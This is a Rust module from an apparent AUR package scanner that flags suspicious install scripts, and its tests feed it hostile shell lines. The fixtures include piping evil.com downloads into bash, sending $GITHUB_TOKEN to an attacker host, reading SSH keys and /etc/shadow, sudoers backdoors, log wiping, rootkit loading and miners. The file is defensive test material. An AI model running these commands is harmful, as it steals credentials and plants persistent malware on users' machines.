pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct InstallScriptAnalysis;

impl Feature for InstallScriptAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.install_script_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let executable_content = crate::shared::shell_syntax::strip_comments(content);
        let joined_content =
            crate::shared::shell_syntax::join_quoted_fragments(&executable_content);
        let mut signals = Vec::new();

        for pat in compiled {
            let analyzed_content = if pat.regex.is_match(&executable_content) {
                &executable_content
            } else if pat.regex.is_match(&joined_content) {
                &joined_content
            } else {
                continue;
            };
            {
                let matched_index = analyzed_content
                    .lines()
                    .position(|line| pat.regex.is_match(line));
                let matched_line = matched_index.and_then(|index| {
                    content
                        .lines()
                        .nth(index)
                        .map(|line| line.trim().to_string())
                });
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                    matched_line,
                    min_tier: None,
                });
            }
        }

        let js_packages = crate::shared::js_package_manager::analyze(&executable_content);
        if let Some(install) = js_packages.named_installs.first() {
            signals.push(Signal {
                id: "P-INSTALL-NAMED-JS-PACKAGE".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 90,
                description: format!(
                    "Install script fetches named package through {}: {}",
                    install.manager, install.package
                ),
                is_override_gate: false,
                matched_line: Some(install.matched_line.clone()),
                min_tier: None,
            });
        }
        if let Some(ioc) = js_packages.known_june_iocs.first() {
            signals.push(Signal {
                id: "P-JUNE-2026-JS-IOC".to_string(),
                category: SignalCategory::Pkgbuild,
                points: 90,
                description: format!(
                    "Named install references known June 2026 incident dependency: {}",
                    ioc.package
                ),
                is_override_gate: false,
                matched_line: Some(ioc.matched_line.clone()),
                min_tier: None,
            });
        }
        let privileged = crate::shared::js_package_manager::find_privileged_mode_changes(
            &executable_content,
            false,
        );
        if let Some(first) = privileged.first() {
            let sandbox_only =
                crate::shared::js_package_manager::privileged_changes_only_chrome_sandbox(
                    &privileged,
                );
            signals.push(if sandbox_only {
                Signal {
                    id: "P-INSTALL-SUID-CHROME-SANDBOX".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 30,
                    description:
                        "Install script sets SUID on an Electron/Chromium chrome-sandbox helper"
                            .to_string(),
                    is_override_gate: false,
                    matched_line: Some(first.matched_line.clone()),
                    min_tier: None,
                }
            } else {
                Signal {
                    id: "P-INSTALL-SUID-SGID".to_string(),
                    category: SignalCategory::Pkgbuild,
                    points: 90,
                    description: "Install script creates or changes a file with SUID/SGID mode"
                        .to_string(),
                    is_override_gate: false,
                    matched_line: Some(first.matched_line.clone()),
                    min_tier: None,
                }
            });
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: Some(content.into()),
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
        };
        InstallScriptAnalysis
            .analyze(&ctx)
            .iter()
            .map(|s| s.id.clone())
            .collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    #[test]
    fn install_curl() {
        let ids = analyze("curl https://example.com/data");
        assert!(has(&ids, "P-INSTALL-CURL"));
    }

    #[test]
    fn install_wget() {
        let ids = analyze("wget https://example.com/data");
        assert!(has(&ids, "P-INSTALL-WGET"));
    }

    #[test]
    fn install_pipe_shell() {
        let ids = analyze("curl https://evil.com/setup | bash");
        assert!(has(&ids, "P-INSTALL-PIPE-SHELL"));
    }

    #[test]
    fn install_persistence() {
        let ids = analyze("systemctl enable evil.service");
        assert!(has(&ids, "P-INSTALL-PERSISTENCE"));
    }

    #[test]
    fn install_profile_mod() {
        let ids = analyze("echo 'export PATH=/evil:$PATH' >> ~/.bashrc");
        assert!(has(&ids, "P-INSTALL-PROFILE-MOD"));
    }

    #[test]
    fn install_ssh_access() {
        let ids = analyze("cat ~/.ssh/id_rsa");
        assert!(has(&ids, "P-INSTALL-SSH-ACCESS"));
    }

    #[test]
    fn install_browser_data() {
        let ids = analyze("tar czf /tmp/loot.tar.gz ~/.mozilla/");
        assert!(has(&ids, "P-INSTALL-BROWSER-DATA"));
    }

    #[test]
    fn install_gpg_access() {
        let ids = analyze("cp -r ~/.gnupg/ /tmp/keys");
        assert!(has(&ids, "P-INSTALL-GPG-ACCESS"));
    }

    #[test]
    fn install_passwd_read() {
        let ids = analyze("cat /etc/shadow > /tmp/hashes");
        assert!(has(&ids, "P-INSTALL-PASSWD-READ"));
    }

    #[test]
    fn install_base64() {
        let ids = analyze("echo payload | base64 -d > /tmp/evil");
        assert!(has(&ids, "P-INSTALL-BASE64"));
    }

    #[test]
    fn install_comment_does_not_trigger_base64() {
        let ids = analyze("# For debugging, decode with base64 -d\npost_install() { :; }");
        assert!(!has(&ids, "P-INSTALL-BASE64"), "got: {ids:?}");
    }

    #[test]
    fn install_eval() {
        let ids = analyze("eval \"$cmd\"");
        assert!(has(&ids, "P-INSTALL-EVAL"));
    }

    #[test]
    fn install_nohup() {
        let ids = analyze("nohup /tmp/backdoor &");
        assert!(has(&ids, "P-INSTALL-NOHUP"));
    }

    #[test]
    fn install_tmp_exec() {
        let ids = analyze("chmod +x /tmp/payload");
        assert!(has(&ids, "P-INSTALL-TMP-EXEC"));
    }

    #[test]
    fn install_chmod_exec() {
        let ids = analyze("chmod +x setup && ./setup");
        assert!(has(&ids, "P-INSTALL-CHMOD-EXEC"));
    }

    #[test]
    fn install_python_exec() {
        let ids = analyze("exec(urlopen('https://evil.com/payload.py').read())");
        assert!(has(&ids, "P-INSTALL-PYTHON-EXEC"));
    }

    #[test]
    fn parameter_length_expansion_does_not_hide_later_install_code() {
        let ids = analyze("value=${#value}; exec(urlopen('https://evil.com/payload.py').read())");
        assert!(has(&ids, "P-INSTALL-PYTHON-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn install_devnull_bg() {
        let ids = analyze("bash /tmp/miner.sh >/dev/null 2>&1 &");
        assert!(has(&ids, "P-INSTALL-DEVNULL-BG"));
    }

    #[test]
    fn install_miner() {
        let ids = analyze("./xmrig --donate-level 0");
        assert!(has(&ids, "P-INSTALL-MINER"));
    }

    #[test]
    fn install_modprobe_by_name_is_weaker() {
        let ids = analyze("post_install() { modprobe uinput || echo failed; }");
        assert!(has(&ids, "P-INSTALL-MODPROBE"), "got: {ids:?}");
        assert!(!has(&ids, "P-INSTALL-KERNEL-MOD"), "got: {ids:?}");
    }

    #[test]
    fn chrome_sandbox_suid_is_down_weighted_only_when_exclusive() {
        let ids = analyze("chmod 4755 '/opt/App/chrome-sandbox' || true");
        assert!(has(&ids, "P-INSTALL-SUID-CHROME-SANDBOX"), "got: {ids:?}");
        assert!(!has(&ids, "P-INSTALL-SUID-SGID"), "got: {ids:?}");
        for content in [
            "chmod 4755 /opt/App/chrome-sandbox /usr/bin/helper",
            "chmod 4755 /opt/App/chrome-sandbox\nchmod u+s /usr/bin/helper",
            "chmod 4755 /opt/App/chrome-sandbox-evil",
            "chmod 4755 /opt/App/*",
            "chmod 6755 /opt/App/chrome-sandbox",
            "chmod 4777 /opt/App/chrome-sandbox",
            "chmod u+s /opt/App/chrome-sandbox",
        ] {
            let ids = analyze(content);
            assert!(has(&ids, "P-INSTALL-SUID-SGID"), "{content}: {ids:?}");
            assert!(
                !has(&ids, "P-INSTALL-SUID-CHROME-SANDBOX"),
                "{content}: {ids:?}"
            );
        }
    }

    #[test]
    fn install_kernel_mod() {
        let ids = analyze("insmod rootkit.ko");
        assert!(has(&ids, "P-INSTALL-KERNEL-MOD"));
    }

    #[test]
    fn install_env_tokens() {
        let ids = analyze("curl -H \"Authorization: $GITHUB_TOKEN\" https://evil.com");
        assert!(has(&ids, "P-INSTALL-ENV-TOKENS"));
    }

    // --- New obfuscation patterns ---

    #[test]
    fn install_ifs() {
        let ids = analyze("cat${IFS}/etc/passwd");
        assert!(has(&ids, "P-INSTALL-IFS"));
    }

    #[test]
    fn install_ansi_c_hex() {
        let ids = analyze("$'\\x63\\x61\\x74' /etc/shadow");
        assert!(has(&ids, "P-INSTALL-ANSI-C-HEX"));
    }

    #[test]
    fn install_rot13() {
        let ids = analyze("echo 'phey uggc://rivy.pbz' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash");
        assert!(has(&ids, "P-INSTALL-ROT13"));
    }

    #[test]
    fn install_history_clear() {
        let ids = analyze("unset HISTFILE; history -c");
        assert!(has(&ids, "P-INSTALL-HISTORY-CLEAR"));
    }

    #[test]
    fn install_log_clear() {
        let ids = analyze("rm -rf /var/log/auth.log");
        assert!(has(&ids, "P-INSTALL-LOG-CLEAR"));
    }

    #[test]
    fn install_sudoers_mod() {
        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
        assert!(has(&ids, "P-INSTALL-SUDOERS-MOD"));
    }

    #[test]
    fn install_prompt_command() {
        let ids = analyze("echo 'PROMPT_COMMAND=\"curl http://evil.com\"' >> ~/.bashrc");
        assert!(has(&ids, "P-INSTALL-PROMPT-COMMAND"));
    }

    #[test]
    fn install_xdg_autostart() {
        let ids = analyze("cp malware.desktop ~/.config/autostart/");
        assert!(has(&ids, "P-INSTALL-XDG-AUTOSTART"));
    }

    // --- Flag spacing bypass (issue #4) ---

    #[test]
    fn install_log_clear_split_flags() {
        let ids = analyze("rm -r -f /var/log/auth.log");
        assert!(has(&ids, "P-INSTALL-LOG-CLEAR"));
    }

    #[test]
    fn install_base64_intervening_flags() {
        let ids = analyze("echo payload | base64 -w 0 -d > /tmp/evil");
        assert!(has(&ids, "P-INSTALL-BASE64"));
    }

    #[test]
    fn install_chmod_exec_intervening_flags() {
        let ids = analyze("chmod -v +x setup && ./setup");
        assert!(has(&ids, "P-INSTALL-CHMOD-EXEC"));
    }

    #[test]
    fn install_tmp_exec_intervening_flags() {
        let ids = analyze("chmod -v +x /tmp/payload");
        assert!(has(&ids, "P-INSTALL-TMP-EXEC"));
    }

    #[test]
    fn benign_install_no_signals() {
        let ids = analyze(
            r#"
post_install() {
    echo "Package installed successfully"
    echo "Run 'myapp --help' to get started"
}

post_upgrade() {
    echo "Package upgraded to $1"
}
"#,
        );
        assert!(
            ids.is_empty(),
            "Benign install script should trigger no signals, got: {ids:?}"
        );
    }
}
